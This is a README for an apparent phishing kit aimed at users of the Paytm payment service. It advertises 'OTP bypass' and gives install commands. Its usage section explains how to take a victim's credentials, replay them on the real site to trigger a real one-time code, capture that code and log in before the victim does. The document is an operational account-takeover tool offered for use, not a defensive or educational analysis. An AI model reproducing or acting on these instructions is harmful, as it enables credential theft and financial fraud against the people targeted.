# Paytm-Phishing
This is Paytm Phishing Tool with OTP Bypass ! Paytm
you can also use AdvPhishing !  

![hi](https://user-images.githubusercontent.com/55870659/75668326-29af2900-5c47-11ea-976c-b6263fc96f03.png)


![3](https://user-images.githubusercontent.com/55870659/75667037-ec499c00-5c44-11ea-8a25-c169365b4e7d.png)

# Usage & Instructions 
When victim enter his credentials, you need to go to original website and use those credentials to send real OTP to victim. Once he enter that OTP such OTP will also be there with you and you will be allowed to login the account before him.

# Requirements
1. ngrok setup
2. Root - Must
3. Apache Server
4. Internet
5. add repo on kali

# How to Intsall & Use
root ---must !
1. git clone https://github.com/Ignitetch/Paytm-Phishing.git
2. cd Paytm-phishing
3. chmod 777 Paytm.sh
4. ./Paytm.sh

# Contact For Contribute
sg5479845@gmail.com

# Support
1 .Kali Linux  2. ubantu
